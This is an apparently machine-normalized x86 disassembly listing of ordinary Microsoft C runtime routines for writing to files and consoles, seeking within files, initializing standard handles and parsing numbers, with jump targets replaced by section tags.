call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
mov edi eax
jmp r-xdata
push 0xa
pop eax
add edi 0x2
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
cmp al 0x1a
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cx
push 0xa
pop eax
add edi 0x4
mov [ esi ] ax
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x2a
jmp r-xdata
mov ebx [ ebp - 0x24 ]
cmp esi ebx
jb r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov eax [ eax * 4 + rw-data ]
cmp edi esi
setne cl
add edi edi
mov [ eax + ebx + 0x30 ] ecx
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cl
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cx
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
add esi 0x2
jmp r-xdata
movzx eax [ edi ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
dec esi
inc edx
movzx eax [ esi ]
cmp [ eax + rw-data ] 0x0
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x1 ] al
jne r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x8 ] ax
jne r-xdata
neg edx
mov eax edx
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_421d63
add esp 0x10
mov al [ esi ]
inc esi
mov [ ecx + ebx + 0x5 ] al
mov eax [ ebp - 0xc ]
cmp edx 0x2
jl r-xdata
cmp edx 0x4
jg r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_421d63
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
jne r-xdata
mov [ esi ] 0xd
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x1 ]
inc esi
mov [ ecx + ebx + 0x5 ] al
jmp r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_421d63
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
jne r-xdata
pop eax
mov [ esi ] ax
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x8 ]
mov [ ecx + ebx + 0x5 ] al
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x7 ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ edx * 4 + rw-data ]
push 0xa
pop ecx
add esi 0x2
mov [ eax + ebx + 0x26 ] cl
mov [ esi ] ax
add esi 0x2
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ ebp - 0xc ]
inc esi
push 0xd
push 0xd
pop ecx
mov [ esi ] cl
mov [ esi ] al
inc esi
pop ecx
push 0xd
push 0xd
pop ecx
mov [ esi ] cx
mov [ esi ] ax
add esi 0x2
jmp r-xdata
pop ecx
sub esi edx
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x26 ] al
inc esi
sub_421207
push 0x10
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_42a185
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4212e9
add esp 0xc
mov edi eax
jmp r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4212c0
mov eax edi
jmp r-xdata
sub_4212e9
push ebp
mov ebp esp
mov eax 0x1af0
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_41ccbd
and [ eax ] edi
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_4170bc
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_41ccbd
and [ eax ] edi
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_4290d7
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_421d63
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_4246d6
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_41ccf1
mov [ eax ] 0x1c
call sub_41ccbd
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_41ccd0
pop ecx
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_427e2d
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_42a54b
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_42a0d2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_42a0d2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_42a54b
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_421b13
push 0x10
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_42a185
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_421bf5
add esp 0xc
mov edi eax
jmp r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_421bcc
mov eax edi
jmp r-xdata
sub_421bf5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_42a43c
pop ecx
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
xor edi edi
push edi
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax ebx
push edi
call sub_41ccd0
pop ecx
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebx
sub_421c67
push 0x18
push r--data
call sub_41ecb0
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_42a185
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_421d63
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_41ecf5
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_421d39
mov edx ebx
jmp r-xdata
sub_421d63
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_42a43c
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_41ccd0
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_421de0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_421e0b
push 0x64
push r--data
call sub_41ecb0
push 0xb
call sub_41ad36
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_41b887
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_41f800
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4220b0
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_41b887
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_4220b9
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_42a58c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_42a5de
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_42a5de
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
